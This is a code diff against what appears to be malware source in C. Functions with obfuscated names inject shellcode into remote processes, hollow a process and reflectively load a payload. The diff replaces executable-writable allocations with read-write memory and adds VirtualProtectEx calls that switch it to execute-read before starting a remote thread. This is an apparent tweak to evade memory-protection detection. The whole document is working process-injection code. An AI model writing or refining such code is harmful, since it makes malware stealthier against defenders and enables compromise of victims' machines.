@@ -558,7 +558,7 @@ void obf_sys_inject_process(void) {
         memcpy(shellcode + 25, &targetExitThread, 8);
     }
     
-    LPVOID remoteCode = obf_VirtualAllocEx(hProc, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID remoteCode = obf_VirtualAllocEx(hProc, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!remoteCode) {
         obf_VirtualAllocEx(hProc, remotePath, 0, MEM_RELEASE, 0); /* VirtualFreeEx proxy */
         CloseHandle(hProc);
@@ -567,6 +567,10 @@ void obf_sys_inject_process(void) {
     
     obf_WriteProcessMemory(hProc, remoteCode, shellcode, sizeof(shellcode), NULL);
     obf_junk_delay();
+    
+    /* Change protection from RW to RX before executing */
+    DWORD oldProtect;
+    VirtualProtectEx(hProc, remoteCode, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect);
     
     HANDLE hThread = obf_CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCode, remotePath, 0, NULL);
     if (hThread) {
@@ -715,13 +719,17 @@ void obf_sys_hollow_process(void) {
     shellcode[off++] = 0xEB;
     shellcode[off++] = (signed char)jmpOffset;
     
-    LPVOID rCode = obf_VirtualAllocEx(hProc, NULL, off, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID rCode = obf_VirtualAllocEx(hProc, NULL, off, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
     if (!rCode) {
         CloseHandle(hProc);
         return;
     }
     
     obf_WriteProcessMemory(hProc, rCode, shellcode, off, NULL);
+    
+    /* Change protection from RW to RX before executing */
+    DWORD oldProtect;
+    VirtualProtectEx(hProc, rCode, off, PAGE_EXECUTE_READ, &oldProtect);
     
     HANDLE hThread = obf_CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)rCode, NULL, 0, NULL);
     if (hThread) CloseHandle(hThread);
@@ -957,10 +965,10 @@ void obf_reflective_load(void) {
     /* 5. Allocate memory in remote process */
     SIZE_T imgSize = nt->OptionalHeader.SizeOfImage;
     PVOID remoteImg = obf_VirtualAllocEx(hProc, (PVOID)prefBase, imgSize,
-                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!remoteImg)
         remoteImg = obf_VirtualAllocEx(hProc, NULL, imgSize,
-                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!remoteImg) {
         CloseHandle(hProc);
         free(payload);
@@ -1150,6 +1158,10 @@ void obf_reflective_load(void) {
             obf_WriteProcessMemory(hProc, pebImageBase, &remoteImg, sizeof(remoteImg), NULL);
         }
     }
+    
+    /* 9.5 Change protection from RW to RX after all writes are done */
+    DWORD oldProtect;
+    VirtualProtectEx(hProc, remoteImg, imgSize, PAGE_EXECUTE_READ, &oldProtect);
 
     /* 10. Create remote thread at entry point */
     DWORD64 entryPoint = (DWORD64)remoteImg + nt->OptionalHeader.AddressOfEntryPoint;
